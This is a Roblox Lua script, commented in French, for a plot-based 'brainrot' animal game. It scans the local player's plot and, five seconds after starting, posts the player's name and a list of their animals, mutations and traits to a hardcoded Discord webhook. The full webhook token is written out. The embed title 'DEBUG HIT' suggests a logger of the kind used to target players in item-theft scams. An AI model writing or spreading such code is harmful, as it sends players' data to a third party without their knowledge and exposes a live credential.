local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Plots = workspace:WaitForChild("Plots")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = workspace:FindFirstChild("Debris") or workspace -- Sécurité si Debris n'est pas là

print("🚀 [DEBUG] Script lancé !")

-- Chargement des modules avec vérification
local success_load, err_load = pcall(function()
    local Datas = ReplicatedStorage:WaitForChild("Datas")
    AnimalsData = require(Datas:WaitForChild("Animals"))
    TraitsData = require(Datas:WaitForChild("Traits"))
    MutationsData = require(Datas:WaitForChild("Mutations"))
end)

if not success_load then
    warn("❌ [DEBUG] Erreur chargement Modules:", err_load)
else
    print("✅ [DEBUG] Modules de données chargés.")
end

local function SendMyBrainrotsToDiscord(brainrotsList)
    print("📤 [DEBUG] Préparation de l'envoi Discord pour", #brainrotsList, "animaux.")
    local WebhookURL = "https://discord.com/api/webhooks/1461105026159083552/ppHZQO_DjQyDApZQzeLGWQCSAtWjmukmCMc4JjZCAMsCGjg5RyEPK28Zj0yD1l71dxPt"
    
    local totalValue = 0
    local animalLines = ""
    
    for _, animal in ipairs(brainrotsList) do
        totalValue = totalValue + (animal.genValue or 0)
        local traitsStr = (#animal.traits > 0) and ("[" .. table.concat(animal.traits, ", ") .. "] ") or ""
        local mutationPrefix = (animal.mutation ~= "Default" and animal.mutation ~= "None") and ("[" .. animal.mutation .. "] ") or ""
        animalLines = animalLines .. string.format("🧠 ➔ %s%s%s ➔ %s %s\n", 
            mutationPrefix, traitsStr, animal.name, animal.rarity, animal.genText)
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "MozilOnTop • DEBUG HIT",
            ["color"] = 0xFF00FF, -- Rose pour le debug
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = Players.LocalPlayer.Name, ["inline"] = true},
                {["name"] = "👑 Brainrots", ["value"] = animalLines, ["inline"] = false}
            }
        }}
    }

    local success_post, err_post = pcall(function()
        return HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data))
    end)

    if success_post then
        print("✅ [DEBUG] Webhook envoyé avec succès !")
    else
        warn("❌ [DEBUG] Échec Webhook:", err_post)
    end
end

local function FormatMoney(value)
    if value >= 1e6 then return string.format("$%.1fM/s", value / 1e6)
    elseif value >= 1e3 then return string.format("$%.1fK/s", value / 1e3)
    else return string.format("$%.1f/s", value) end
end

local function GetMyBrainrots()
    print("🔍 [DEBUG] Scan des plots en cours...")
    local myPlotFound = false

    for _, plot in ipairs(Plots:GetChildren()) do
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local yourBase = sign:FindFirstChild("YourBase")
            -- On vérifie si YourBase existe ET s'il est activé (signe que c'est TON terrain)
            if yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled then
                myPlotFound = true
                print("🏠 [DEBUG] Ton terrain a été trouvé:", plot.Name)
                
                local brainrots = {}
                local children = plot:GetChildren()
                print("📦 [DEBUG] Nombre d'objets sur le plot:", #children)

                for _, child in ipairs(children) do
                    local config = AnimalsData[child.Name]
                    if config then
                        print("✨ [DEBUG] Animal détecté:", child.Name)
                        local currentMutation = child:GetAttribute("Mutation") or "Default"
                        local rawTraits = child:GetAttribute("Traits")
                        local currentTraits = {}

                        if type(rawTraits) == "string" then
                            for t in string.gmatch(rawTraits, '([^,]+)') do 
                                table.insert(currentTraits, t:match("^%s*(.-)%s*$")) 
                            end
                        end

                        table.insert(brainrots, {
                            name = config.DisplayName or child.Name,
                            genText = FormatMoney(config.Generation or 0),
                            genValue = config.Generation or 0,
                            rarity = config.Rarity or "Common",
                            mutation = currentMutation,
                            traits = currentTraits
                        })
                    end
                end
                
                if #brainrots > 0 then
                    SendMyBrainrotsToDiscord(brainrots)
                else
                    warn("⚠️ [DEBUG] Aucun animal reconnu sur ton plot.")
                end
                break
            end
        end
    end

    if not myPlotFound then
        warn("❌ [DEBUG] Impossible de trouver ton plot. Es-tu bien propriétaire d'un terrain ?")
    end
end

-- Lancement différé
task.spawn(function()
    print("⏳ [DEBUG] Attente de 5 secondes avant le scan...")
    task.wait(5)
    GetMyBrainrots()
end)
